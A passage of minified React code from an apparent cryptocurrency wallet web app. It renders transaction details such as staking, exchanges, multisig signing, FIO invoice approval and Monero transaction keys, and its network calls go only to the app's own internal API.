                        [qR.black]: "fio-appruved" === l.type && l.isIncoming
                    }, qR.multisigTxAmount)
                }, g && (l.isIncoming ? "-" : "+"), g, " ", (0,
                be.wL)((0,
                be.xG)(l.currencyFrom)));
            if (isKinActivation(l))
                return null;
            if (isXtzDelegation(l))
                return null;
            if (isCloStakingReward(l))
                return null;
            if (isCloStakingWithdraw(l))
                return null;
            if (isTrxUnstaking(l) || isTrxDelegating(l) || isTrxUndelegating(l) || isTrxCancelUnstake(l))
                return null;
            if (isTrxWithdrawUnfreezedStaking(l))
                return O.createElement(O.Fragment, null, "+", g, " TRX");
            if (isTrxStaking(l))
                return O.createElement(O.Fragment, null, "-", g, " TRX");
            if (s && v)
                return O.createElement("div", null, O.createElement("span", {
                    className: Ht()(qR.outcomingExchange, qR[`exchange-${v.status}`] || "")
                }, (0,
                Ko.i1)(v.amountFrom), " ", (0,
                be.wL)((0,
                be.xG)(l.currencyFrom)), " ⟶"), O.createElement("span", {
                    className: Ht()(qR.incomingExchange, qR[`exchange-${v.status}`] || "")
                }, v.hashTo ? "" : "~", (0,
                Ko.i1)(v.amountTo), " ", (0,
                be.wL)((0,
                be.xG)(l.currencyTo))));
            if (i && v)
                return O.createElement("div", null, v.amountFrom, " ", (0,
                be.wL)((0,
                be.xG)(l.currencyFrom)), " ⟶", O.createElement("span", {
                    className: Ht()(qR.incomingExchange)
                }, (0,
                Ko.FH)(v.amountTo, {
                    min: 2,
                    max: 2
                }), " ", (0,
                be.wL)((0,
                be.xG)(v.currencyTo))));
            if (!p)
                return null;
            if (isTxNowFreeze(l) || isTxNowUnFreeze(l) || isTxNowReward(l))
                return O.createElement(O.Fragment, null, g, " ", O.createElement("span", {
                    className: qR.currencyTicker
                }, (0,
                be.wL)((0,
                be.xG)(l.currencyFrom))), !!l.family && l.currencyFrom !== l.family && O.createElement("span", {
                    className: qR.currencyFamily
                }, l.family));
            const _ = (null == l || null === (n = l.addressFrom) || void 0 === n ? void 0 : n.toLowerCase()) === (null == l || null === (r = l.addressTo) || void 0 === r ? void 0 : r.toLowerCase())
              , w = E && !f;
            return O.createElement(O.Fragment, null, (!w || !_) && !(0,
            Ko.eq)(h, 0) && (l.isIncoming ? "+" : "-"), w && _ ? "..." : g, " ", O.createElement("span", {
                className: qR.currencyTicker
            }, (0,
            be.wL)((0,
            be.xG)(l.currencyFrom))), !!l.family && l.currencyFrom !== l.family && O.createElement("span", {
                className: qR.currencyFamily
            }, l.family))
        }
        function TxNormalView(e) {
            var t;
            let {tx: a} = e;
            const {convertToFiat: n, isAvailableRate: r} = useConverter()
              , l = getSimpleWalletObject(a)
              , s = !Number.isNaN(parseFloat(a.amount))
              , i = XR.includes((null == a || null === (t = a.currencyFrom) || void 0 === t ? void 0 : t.toLowerCase()) || "") ? (0,
            Ko.h9)(a.amount, a.fee).toString() : a.amount
              , o = a.isIncoming ? a.amount : i
              , c = s && r(l) ? n(o, l) : null;
            return O.createElement(O.Fragment, null, a.isError && O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Status"), O.createElement("div", {
                className: Ht()(qR.detailsStatus, qR.error)
            }, "Fail")), s && O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Amount"), O.createElement("div", {
                className: qR.userSelect
            }, (0,
            Ko.yF)(o), " ", (0,
            be.wL)((0,
            be.xG)(isEthStaking(a) ? "eth" : a.currencyFrom || a.currencyTx)), c && O.createElement(O.Fragment, null, " ", "~ ", O.createElement(fiat_estimate_FiatEstimate, {
                value: c,
                renderCurrency: !0
            })))), void 0 !== a.confirmations && a.confirmations >= 0 && O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Confirmations"), O.createElement("div", null, a.confirmations || 0)))
        }
        const QR = undefined
          , utils_getHashWhithDoubleSpaceOrBr = e => O.createElement(O.Fragment, null, e, e.length > 60 ? O.createElement("br", null) : O.createElement(O.Fragment, null, "  "));
        function TxMultisigView(e) {
            var t, a;
            let {tx: n} = e;
            const r = (0,
            be.Kb)(n.family, n.currency, n.transactionHash);
            return O.createElement(O.Fragment, null, O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Currency"), O.createElement("div", null, (0,
            be.xG)(n.currency))), O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Signatures"), O.createElement("div", null, "Requires ", n.minimumSigAmount, " of ", n.participants.length)), O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Participants"), O.createElement("div", null, n.participants.map(( (e, t) => O.createElement("span", {
                key: t
            }, utils_getHashWhithDoubleSpaceOrBr(e.data), O.createElement(button_copy, {
                text: e.data,
                className: qR.buttonCopy
            }), O.createElement("br", null)))))), !!r && "btc" !== n.currency && "btc-testnet" !== n.currency && O.createElement("div", {
                className: Ht()(qR.txDetailLine, qR.hashBlock)
            }, O.createElement("span", null, "Hash"), O.createElement("div", null, O.createElement("a", {
                href: r,
                target: "_blank",
                rel: "noreferrer noopener"
            }, n.transactionHash), "  ", O.createElement(button_copy, {
                text: n.transactionHash,
                className: qR.buttonCopy
            }))), O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Address"), O.createElement("div", null, n.address, "  ", O.createElement(button_copy, {
                text: n.address,
                className: qR.buttonCopy
            }))), (null === (t = n.original) || void 0 === t ? void 0 : t.fee) && O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Fee"), O.createElement("div", {
                className: qR.userSelect
            }, null === (a = n.original) || void 0 === a ? void 0 : a.fee, " ", (0,
            be.xG)(n.currency))))
        }
        let JR;
        function TxMultisigTxsView(e) {
            var t, a, n;
            let {tx: r} = e;
            const l = (0,
            $.v9)($c)
              , s = (0,
            $.I0)()
              , i = getTxHash(r)
              , [o,c] = (0,
            O.useState)(!1)
              , [u,d] = (0,
            O.useState)("")
              , [m,p] = (0,
            O.useState)([])
              , [f,E] = (0,
            O.useState)(i)
              , [h,g] = (0,
            O.useState)([])
              , [y,v] = (0,
            O.useState)(!1)
              , [_,w] = (0,
            O.useState)("0")
              , [b,k] = (0,
            O.useState)("")
              , [S,C] = (0,
            O.useState)("")
              , [N,T] = (0,
            O.useState)(0)
              , A = null !== (t = r.participants) && void 0 !== t ? t : []
              , x = null !== (a = r.states) && void 0 !== a ? a : [];
            async function calculateSigCount(e) {
                const t = await e.countMultisigSignatures(r);
                T(t)
            }
            const initScriptTransaction = async e => {
                const t = x.sort(( (e, t) => e.createdAt < t.createdAt ? 1 : -1))[0].transactionData
                  , a = e.restoreTransaction(t)
                  , n = A.map((e => e.data));
                Object.keys(a.inputs[0]).length || e.restoreTransactionInputs(a, r.minimumSigAmount, n);
                const s = l.filter((e => e.publicKey && n.includes(e.publicKey))).map((e => e.privateKey))
                  , i = new Set;
                for (const t of s) {
                    if (!t)
                        continue;
                    const n = await e.getKeyPairByPrivateKey(t);
                    for (let e = 0; e < a.inputs.length; e += 1) {
                        const r = undefined;
                        a.inputs[e].pubKeys.some(( (t, r) => !!n.getPublicKeyBuffer().equals(t) && !!a.inputs[e].signatures[r])) || i.add(t)
                    }
                }
                p([...i]);
                g(a)
            }
              , initSmartContractTransaction = async (e, t) => {
                const a = l.map((e => e.address))
                  , n = x.find((e => e.nonce));
                z()(n, "Expected a state with a nonce");
                const {nonce: s} = n;
                let i = 0;
                for (let n = 0; n < A.length; n += 1) {
                    const l = A[n].data
                      , o = undefined;
                    if (await e.isMultisigSignedBy(t, r.destination, r.amount, s, l))
                        i += 1;
                    else if (a.includes(l) && 0 === m.length) {
                        p([l]);
                        try {
                            const a = await e.getGasPrice();
                            k(a);
                            const n = await e.estimateMultisigApproveGasLimit(t, l, r.destination, r.amount);
                            C(n);
                            const s = await e.getFee({
                                gasPrice: a,
                                gasLimit: n
                            });
                            w(s.fee)
                        } catch (e) {
                            console.error(e);
                            v(!0)
                        }
                    }
                }
                T(i)
            }
            ;
            (0,
            O.useEffect)(( () => {
                async function fetchApi() {
                    const e = await Se.Z.getApiByMultisigTransaction(r);
                    let t;
                    if (r.walletType === we._h.BITCOIN) {
                        t = await e.createMultisigAddress({
                            publicKeys: A.map((e => e.data)),
                            minSignatures: r.minimumSigAmount
                        });
                        await initScriptTransaction(e);
                        await calculateSigCount(e)
                    } else {
                        t = await e.getMultisigAddress(r.walletAddressData);
                        await initSmartContractTransaction(e, t)
                    }
                    await d(t)
                }
                fetchApi()
            }
            ), [r]);
            const handleSignTx = async () => {
                const e = await Se.Z.getApiByMultisigTransaction(r);
                try {
                    if (r.walletType === we._h.BITCOIN) {
                        const {hash: t, preparedData: a} = await e.prepareSignMultisigTransaction({
                            transactionBuilder: h,
                            privateKeys: m,
                            participantPubKeys: A.map((e => e.data)),
                            minimumSigAmount: r.minimumSigAmount
                        });
                        try {
                            await U.nW.post(`/api/v1/internal/multisigs/transactions/${r.transactionId}`, a)
                        } catch (e) {}
                        if (t) {
                            cc.$.send(cc.d.MULTISIG_SIGN_FULL, r.currencyTx);
                            E(t.hash);
                            c(!0);
                            return
                        }
                        s(fetchMultisigTransactions());
                        cc.$.send(cc.d.MULTISIG_SIGN_PARTIALLY, r.currencyTx);
                        c(!0)
                    } else {
                        var t;
                        const a = x.length + 1 >= (null !== (t = r.minimumSigAmount) && void 0 !== t ? t : NaN)
                          , n = l.filter((e => m.includes(e.address)))[0]
                          , s = await e.sendMultisigTransaction({
                            amount: r.amount,
                            currencyFrom: r.currencyTx,
                            addressFrom: m[0],
                            privateKey: n.privateKey,
                            contractAddress: u,
                            transactionHash: r.walletAddressData,
                            transactionId: r.transactionId,
                            destination: r.destination,
                            gasLimit: S,
                            gasPrice: b,
                            signFull: a
                        });
                        try {
                            await U.nW.post(`/api/v1/internal/multisigs/transactions/${r.transactionId}`, {
                                transactionData: s.transactionData,
                                transactionHash: a ? s.transactionData : void 0
                            })
                        } catch (e) {}
                        p([n.address]);
                        cc.$.send(a ? cc.d.MULTISIG_SIGN_FULL : cc.d.MULTISIG_SIGN_PARTIALLY, r.currencyTx);
                        E(s.hash);
                        c(!0)
                    }
                } catch (e) {
                    v(!0);
                    window.clearTimeout(JR);
                    JR = window.setTimeout(( () => v(!1)), 2e3);
                    throw e
                }
            }
              , isShowSignButton = () => {
                if (0 === m.length)
                    return !1;
                if (r.walletType === we._h.BITCOIN) {
                    var e;
                    return N < (null !== (e = r.minimumSigAmount) && void 0 !== e ? e : NaN)
                }
                return !0
            }
              , I = getTxHashLink(r, null != f ? f : void 0, r.currencyTx, r.currencyTx);
            return O.createElement(O.Fragment, null, O.createElement("div", {
                className: Ht()(qR.txDetailLine, qR.hashBlock)
            }, O.createElement("span", null, "From"), u ? O.createElement("div", null, u, "  ", O.createElement(button_copy, {
                text: u,
                className: qR.buttonCopy
            })) : O.createElement(LoaderDots, {
                visible: !0
            })), O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "To"), O.createElement("div", null, r.destination, "  ", O.createElement(button_copy, {
                text: null !== (n = r.destination) && void 0 !== n ? n : "unknown destination",
                className: qR.buttonCopy
            }))), f && O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Hash"), O.createElement("div", null, !!f && O.createElement(O.Fragment, null, O.createElement("a", {
                target: "_blank",
                rel: "noopener noreferrer",
                href: I
            }, f), O.createElement("br", null), O.createElement(button_copy, {
                text: I,
                className: qR.buttonCopy
            })), !f && O.createElement(O.Fragment, null, O.createElement("span", {
                className: qR.italicLabel
            }, "Hash unavailable")))), O.createElement("div", {
                className: Ht()(qR.txDetailLine, qR.hashBlock)
            }, O.createElement("span", null, "Signatures"), O.createElement("div", null, N, " (", r.minimumSigAmount, " of ", A.length, " required)")), O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Participants"), O.createElement("div", null, A.map(( (e, t) => O.createElement("span", {
                key: t
            }, utils_getHashWhithDoubleSpaceOrBr(e.data), O.createElement(button_copy, {
                text: e.data,
                className: qR.buttonCopy
            }), O.createElement("br", null)))))), isShowSignButton() && O.createElement(O.Fragment, null, O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Sign Fee"), O.createElement("div", {
                className: qR.userSelect
            }, (0,
            Ko.yF)(_), " ", (0,
            be.xG)(r.currencyTx)))), y && O.createElement("div", {
                className: qR.footerMultisigButtons
            }, O.createElement("div", null), O.createElement("div", null, "Error sign transaction")), !y && isShowSignButton() && !i && O.createElement("div", {
                className: qR.footerMultisigButtons
            }, O.createElement("div", null), O.createElement(Yl, {
                onClick: handleSignTx,
                color: "light-blue",
                disabled: o
            }, "Sign")), !y && !isShowSignButton() && O.createElement("div", {
                className: qR.footerMultisigButtons
            }, O.createElement("div", null), O.createElement("div", null, "(You have signed)")))
        }
        function TxSellView(e) {
            let {tx: t} = e;
            return O.createElement(O.Fragment, null, O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Status"), O.createElement("div", {
                className: Ht()(qR.detailsStatus)
            }, getSellPaymentStatus(t))), O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Sell"), O.createElement("div", {
                className: qR.userSelect
            }, "-", t.extra.amountFrom, " ", (0,
            be.wL)((0,
            be.xG)(t.extra.currencyFrom)))), O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Will receive"), O.createElement("div", {
                className: qR.userSelect
            }, O.createElement(fiat_estimate_FiatEstimate, {
                value: t.extra.amountTo
            }), " ", (0,
            be.xG)(t.extra.currencyTo))))
        }
        function TxClaimKmd(e) {
            let {tx: t} = e;
            if (!t.extra || !isKmdClaim(t))
                return null;
            const {convertToFiat: a} = useConverter()
              , n = getSimpleWalletObject(t)
              , r = undefined
              , l = !Number.isNaN(parseFloat(t.amount)) && a(t.amount, n);
            return O.createElement(O.Fragment, null, O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Reward"), O.createElement("div", {
                className: qR.userSelect
            }, "+", t.extra.claimAmount, " KMD", l && O.createElement(O.Fragment, null, " ", "~ ", O.createElement(fiat_estimate_FiatEstimate, {
                value: l,
                renderCurrency: !0
            })))))
        }
        const eB = "INVOICE_CREATED"
          , tB = "INVOICE_REJECTED"
          , aB = "INVOICE_APPROVED"
          , nB = "INVOICE_STARTED_APPROVE"
          , rB = "ADDRESS_CREATED";
        class FioLogger {
            static async info(e, t) {
                try {
                    e.status = t;
                    return await Jf().post("/api/v1/internal/fio/statistic", e)
                } catch (e) {
                    return {
                        status: !1
                    }
                }
            }
        }
        function TxFioView(e) {
            var t, a, n, r, l, s, i, o, c, u, d;
            let {tx: m} = e;
            const p = (0,
            $.v9)(au)
              , f = (0,
            $.I0)()
              , [E,h] = (0,
            O.useState)(!1)
              , g = p(m.original.payer_fio_public_key, "fio");
            async function handleDecline() {
                h(!0);
                const e = await Se.Z.getApiByCurrency("fio");
                await e.rejectInvoice({
                    privateKey: g.privateKey,
                    addressFrom: g.address,
                    invoiceId: m.original.fio_request_id
                });
                FioLogger.info({
                    fromFioAddress: m.original.payee_fio_address,
                    toFioAddress: m.original.payer_fio_address,
                    requestId: m.original.fio_request_id
                }, tB);
                await f(removeFioTransactionByRequestId(m.original.fio_request_id));
                h(!1)
            }
            function createApproveLink() {
                var e, t;
                const a = {
                    fioWalletFrom: g.uuid,
                    amount: m.amount,
                    fromCurrency: m.currencyTo.toLowerCase(),
                    addressTo: m.addressTo,
                    accountTo: null == m || null === (e = m.original) || void 0 === e ? void 0 : e.payee_fio_address,
                    accountFrom: null == m || null === (t = m.original) || void 0 === t ? void 0 : t.payer_fio_address,
                    invoiceId: m.original.fio_request_id,
                    memo: m.original.content.memo || ""
                };
                return objectToString(a)
            }
            return O.createElement(O.Fragment, null, "fio-pending" === m.type && m.isIncoming ? O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Status"), O.createElement("div", {
                className: qR.detailsStatus
            }, "Invoice is waiting for your response")) : (null === (t = m.original) || void 0 === t ? void 0 : t.status) && O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Status"), O.createElement("div", {
                className: qR.detailsStatus
            }, m.original.status.split("_").join(" "))), m.original.payee_fio_public_key && O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Recipient"), O.createElement("div", null, O.createElement("b", null, m.original.payee_fio_address), "  ", O.createElement(button_copy, {
                className: qR.buttonCopy,
                text: m.original.payee_fio_address
            }), O.createElement("br", null), utils_getHashWhithDoubleSpaceOrBr(m.original.payee_fio_public_key), O.createElement(button_copy, {
                className: qR.buttonCopy,
                text: m.original.payee_fio_public_key
            }))), m.original.payer_fio_public_key && O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Payer"), O.createElement("div", null, O.createElement("b", null, m.original.payer_fio_address), "  ", O.createElement(button_copy, {
                className: qR.buttonCopy,
                text: m.original.payer_fio_address
            }), O.createElement("br", null), utils_getHashWhithDoubleSpaceOrBr(m.original.payer_fio_public_key), O.createElement(button_copy, {
                className: qR.buttonCopy,
                text: m.original.payer_fio_public_key
            }))), (null === (a = m.original) || void 0 === a || null === (n = a.content) || void 0 === n ? void 0 : n.payer_public_address) && O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "From"), O.createElement("div", null, utils_getHashWhithDoubleSpaceOrBr(null === (r = m.original) || void 0 === r || null === (l = r.content) || void 0 === l ? void 0 : l.payer_public_address), O.createElement(button_copy, {
                className: qR.buttonCopy,
                text: null === (s = m.original) || void 0 === s || null === (i = s.content) || void 0 === i ? void 0 : i.payer_public_address
            }))), m.addressTo && O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "To"), O.createElement("div", null, utils_getHashWhithDoubleSpaceOrBr(m.addressTo), O.createElement(button_copy, {
                className: qR.buttonCopy,
                text: m.addressTo
            }))), void 0 !== (null == m || null === (o = m.original) || void 0 === o || null === (c = o.content) || void 0 === c ? void 0 : c.amount) && O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Amount"), O.createElement("div", {
                className: qR.userSelect
            }, null == m || null === (u = m.original) || void 0 === u || null === (d = u.content) || void 0 === d ? void 0 : d.amount, " ", (0,
            be.xG)(m.currencyTo))), !!m.original && !!m.original.content.memo && O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Memo"), O.createElement("div", null, m.original.content.memo, "  ", O.createElement(button_copy, {
                text: m.original.content.memo,
                className: qR.buttonCopy
            }))), !!m.original && !!m.original.fio_request_id && O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Request ID"), O.createElement("div", null, m.original.fio_request_id, "  ", O.createElement(button_copy, {
                text: m.original.fio_request_id,
                className: qR.buttonCopy
            }))), E && O.createElement(O.Fragment, null, O.createElement("span", null, " "), O.createElement("div", {
                className: qR.footerButtons
            }, O.createElement(LoaderDots, {
                visible: !0
            }))), !E && "fio-pending" === m.type && "rejected" !== m.status && m.isIncoming && O.createElement(O.Fragment, null, O.createElement("span", null, " "), O.createElement("div", {
                className: qR.footerButtons
            }, O.createElement(Y.OL, {
                to: `${(0,
                M.RU)()}/fio/invoice-approve?${createApproveLink()}`
            }, O.createElement(Yl, {
                color: "light-blue",
                size: "small"
            }, "Approve")), O.createElement(Yl, {
                color: "light-blue",
                size: "small",
                onClick: handleDecline
            }, "Decline"))))
        }
        function tx_xtz_delegation_TxClaimKmd(e) {
            let {tx: t} = e;
            return O.createElement(O.Fragment, null, O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Validator"), O.createElement("div", null, t.extra ? O.createElement(O.Fragment, null, utils_getHashWhithDoubleSpaceOrBr(t.extra.delegateTarget), O.createElement(button_copy, {
                text: t.extra.delegateTarget,
                className: qR.buttonCopy
            })) : "-")))
        }
        function ViewAtomStaking(e) {
            let {tx: t} = e;
            const {listOfValidators: a} = bI();
            if (!t.extra && "atom" !== t.currencyFrom)
                return null;
            const n = t.extra.validator_address
              , r = a.find((e => e.original.operator_address === n));
            return O.createElement(O.Fragment, null, !!n && O.createElement("div", {
                className: Ht()(qR.txDetailLine, qR.hashBlock)
            }, O.createElement("span", null, "Validator"), O.createElement("div", null, r && O.createElement(O.Fragment, null, O.createElement("b", null, r.title), O.createElement("br", null)), n, "  ", O.createElement(button_copy, {
                text: n,
                className: qR.buttonCopy
            }))))
        }
        ViewAtomStaking.propTypes = {
            tx: as().object
        };
        const is_multisig = e => {
            const t = (0,
            $.v9)(selectedMultisigsAddresses);
            return t.indexOf(e.addressFrom) > -1 || t.indexOf(e.addressTo) > -1
        }
          , ViewHeader = e => {
            let {tx: t} = e;
            const a = watch_only(t)
              , n = hw_address(t)
              , r = is_multisig(t);
            if (oc)
                return null;
            const l = getTransactionType(t)
              , s = l === xv || l === zv || l === l_;
            let i = "";
            if (l) {
                i = o_[l];
                l === Ev && (i = O.createElement(O.Fragment, null, i, " ", O.createElement("span", {
                    className: qR.extraLabel
                }, "Extra"), " "));
                l === t_ && (i = O.createElement(O.Fragment, null, (0,
                be.xG)(t.currency), " ", i));
                l === i_ && (i = formatAddress(t.hash, 13))
            }
            if (!i)
                return null;
            const o = getTxHashLink(t, t.hash || void 0);
            return O.createElement("span", {
                className: Ht()({
                    [qR.yellow]: s
                })
            }, i, a && O.createElement("span", {
                className: qR.italicLabel
            }, "(watch only)"), r && O.createElement("span", {
                className: qR.italicLabel
            }, "(multisig)"), n && O.createElement("span", {
                className: qR.italicLabel
            }, "(ledger)"), i === i_ && O.createElement("a", {
                target: "_blank",
                rel: "noopener noreferrer",
                href: o
            }, O.createElement("img", {
                src: Bp,
                alt: ""
            })))
        }
        ;
        function ViewExtra(e) {
            let {tx: t} = e;
            return O.createElement(O.Fragment, null, !!t.extra && !!t.extra.gasPrice && O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Gas Price"), O.createElement("div", {
                className: qR.userSelect
            }, (0,
            Ko.$q)(t.extra.gasPrice, null != t.extra.gasPricePrecision ? 10 ** t.extra.gasPricePrecision : 1e-9).toString(), " ", t.extra.gasPriceUnits || "GWei")), !!t.extra && !!t.extra.gas && O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Gas Limit"), O.createElement("div", {
                className: qR.userSelect
            }, t.extra.gas)), !!t.extra && !!t.extra.gasUsed && O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Gas Used"), O.createElement("div", {
                className: qR.userSelect
            }, t.extra.gasUsed)), !!t.extra && void 0 !== t.extra.nonce && O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Nonce"), O.createElement("div", null, t.extra.nonce)), !!t.extra && !!t.extra.meta && O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Meta"), O.createElement("div", null, t.extra.meta, "  ", O.createElement(button_copy, {
                text: t.extra.meta,
                className: qR.buttonCopy
            }))), !!t.memo && O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Memo"), O.createElement("div", null, t.memo, "  ", O.createElement(button_copy, {
                text: t.memo,
                className: qR.buttonCopy
            }))), !!t.extra && !!t.extra.memo && O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Memo"), O.createElement("div", null, t.extra.memo, "  ", O.createElement(button_copy, {
                text: t.extra.memo,
                className: qR.buttonCopy
            }))), !!t.extra && !!t.extra.data && O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Custom Data"), O.createElement("div", null, t.extra.data, "  ", O.createElement(button_copy, {
                text: t.extra.data,
                className: qR.buttonCopy
            }))), !!t.extra && !!t.extra.paymentId && O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Payment ID"), O.createElement("div", null, O.createElement("a", {
                href: `https://payment-status.simplex.com/#/payment/${t.extra.paymentId}`,
                target: "_blank",
                rel: "noopener noreferrer"
            }, t.extra.paymentId), "  ", O.createElement(button_copy, {
                text: t.extra.paymentId,
                className: qR.buttonCopy
            }))), Boolean(t.extra) && Boolean(t.extra.destinationTag) && O.createElement("div", {
                className: qR.txDetailLine
            }, O.createElement("span", null, "Destination Tag"), O.createElement("div", null, t.extra.destinationTag, "  ", O.createElement(button_copy, {
                text: t.extra.destinationTag,
                className: qR.buttonCopy
            }))))
        }
        ViewExtra.propTypes = {
            tx: as().object
        };
        const isValidAddress = e => "invalidaddress" !== e && "coinbase" !== e && "segwit" !== e;
        function ViewFromTo(e) {
            let {tx: t} = e;
            const a = isTrxUnstaking(t) || isTrxClaiming(t) || isEthStaking(t) || isTrxUndelegating(t) ? t.addressTo : t.addressFrom
              , n = isTrxUnstaking(t) || isTrxClaiming(t) || isTrxUndelegating(t) ? t.addressFrom : t.addressTo;
            return O.createElement(O.Fragment, null, !!a && !isNeoClaim(t) && !isGethDeposit(t) && O.createElement("div", {
                className: Ht()(qR.txDetailLine, qR.hashBlock)
            }, O.createElement("span", null, "From"), O.createElement("div", null, a, "  ", isValidAddress(a) && O.createElement(button_copy, {
                text: a,
                className: qR.buttonCopy
            }))), !!n && !isEthStaking(t) && O.createElement("div", {
                className: Ht()(qR.txDetailLine, qR.hashBlock)
            }, O.createElement("span", null, "To"), O.createElement("div", null, n, "  ", isValidAddress(n) && O.createElement(button_copy, {
                text: n,
                className: qR.buttonCopy
            }))))
        }
        ViewFromTo.propTypes = {
            tx: as().object
        };
        const lB = "xmr-txs-keys"
          , sB = "@xmr-txs/SET_TX_KEY"
          , iB = {
            txKeys: {}
        }
          , oB = ["txKeys"]
          , cB = (0,
        Ru.Z)({
            [sB]: (e, t) => {
                let {txKeys: a} = t;
                return {
                    ...e,
                    txKeys: a
                }
            }
        }, iB)
          , selectedTxKeys = e => e[lB].txKeys || {}
          , uB = (0,
        _t.P1)(selectedTxKeys, (e => async t => e && e[t] || null))
          , setTxKey = (e, t) => async (a, n) => {
            const r = n()
              , l = selectedTxKeys(r);
            l[e] = t;
            a({
                type: sB,
                txKeys: l
            })
        }
          , dB = ee.P.create({
            name: "reducer-xmr-txs"
        });
        function ViewXmrKeys(e) {
            let {tx: t} = e;
            const [a,n] = (0,
            O.useState)(null)
              , r = (0,
            $.I0)()
              , l = (0,
            $.v9)(au)
              , s = (0,
            $.v9)(uB)
              , fetchTxKey = async (e, t) => {
                const a = await s(t)
                  , {privateKey: l} = e
                  , i = await Se.Z.getApiByWallet(e);
                if (a) {
                    const e = a;
                    try {
                        const t = i.decodeExtraTxData({
                            encodedData: e,
                            privateKey: l
                        });
                        n(t)
                    } catch (e) {
                        dB.error(e.message, e)
                    }
                } else
                    try {
                        const e = await i.fetchEncodedData({
                            txId: t
                        });
                        r(setTxKey(t, e));
                        const a = i.decodeExtraTxData({
                            encodedData: e,
                            privateKey: l
                        });
                        n(a)
                    } catch (e) {
                        dB.error(e.message, e)
                    }
            }
            ;
            (0,
            O.useEffect)(( () => {
                if (t && !1 === t.isIncoming && "xmr" === t.currencyFrom) {
                    const e = l(t.addressFrom, t.currencyFrom);
                    e && fetchTxKey(e, t.hash)
                }
            }
            ), []);
            return O.createElement(O.Fragment, null, a && O.createElement(O.Fragment, null, O.createElement("div", {
                className: Ht()(qR.txDetailLine, qR.hashBlock)
            }, O.createElement("span", null, "Tx private key"), O.createElement("div", null, a.txPrivKey, "  ", O.createElement(button_copy, {
                text: a.txPrivKey,
                className: qR.buttonCopy
            }))), O.createElement("div", {
                className: Ht()(qR.txDetailLine, qR.hashBlock)
            }, O.createElement("span", null, "Tx public key"), O.createElement("div", null, a.txPubKey, "  ", O.createElement(button_copy, {
                text: a.txPubKey,
                className: qR.buttonCopy
            })))))
        }
        ViewXmrKeys.propTypes = {
            tx: as().object
        };
        function ViewHashes(e) {
            let {tx: t} = e;
            const a = isExchange(t)
              , n = isMultisigTxs(t)
              , r = getTxHash(t);
            return O.createElement(O.Fragment, null, t.hash && !a && !n && O.createElement("div", {
                className: Ht()(qR.txDetailLine, qR.hashBlock)
            }, O.createElement("span", null, "Hash"), O.createElement("div", null, O.createElement("a", {
                target: "_blank",
                rel: "noopener noreferrer",
                href: getTxHashLink(t, r)
            }, r), "  ", O.createElement(button_copy, {
                text: getTxHashLink(t, r),
                className: qR.buttonCopy
            }))), a && t.extra.hashFrom && O.createElement("div", {
                className: Ht()(qR.txDetailLine, qR.hashBlock)
            }, O.createElement("span", null, (0,
            be.wL)((0,
            be.xG)(t.currencyFrom)), " hash"), O.createElement("div", null, O.createElement("a", {
                target: "_blank",
                rel: "noopener noreferrer",
                href: getTxHashLink(t, t.extra.hashFrom, t.currencyFrom, t.extra.familyFrom)
            }, t.extra.hashFrom), " ", O.createElement(button_copy, {
                text: getTxHashLink(t, t.extra.hashFrom, t.currencyFrom, t.extra.familyFrom),
                className: qR.buttonCopy
            }))), a && t.extra.hashTo && O.createElement("div", {
                className: Ht()(qR.txDetailLine, qR.hashBlock)
            }, O.createElement("span", null, (0,
            be.wL)((0,
            be.xG)(t.currencyTo)), " hash"), O.createElement("div", null, O.createElement("a", {
                target: "_blank",
                rel: "noopener noreferrer",
                href: getTxHashLink(t, t.extra.hashTo, t.currencyTo, t.extra.familyTo)
            }, t.extra.hashTo), " ", O.createElement(button_copy, {
                text: getTxHashLink(t, t.extra.hashTo, t.currencyTo, t.extra.familyTo),
                className: qR.buttonCopy
            }))))
        }
        ViewHashes.propTypes = {
            tx: as().object
        };
        const mB = "GET_FAILED_EXCHANGE_TX_ACTIONS"
          , pB = "CONTINUE_FAILED_EXCHANGE_TX"
          , fB = "REFUND_FAILED_EXCHANGE_TX"
          , EB = (0,
        gw.PH)(mB, ( (e, t) => ({
            meta: e,
            payload: t
        })))
          , hB = (0,
        gw.PH)(pB, ( (e, t) => ({
            meta: e,
            payload: t
        })))
          , gB = (0,
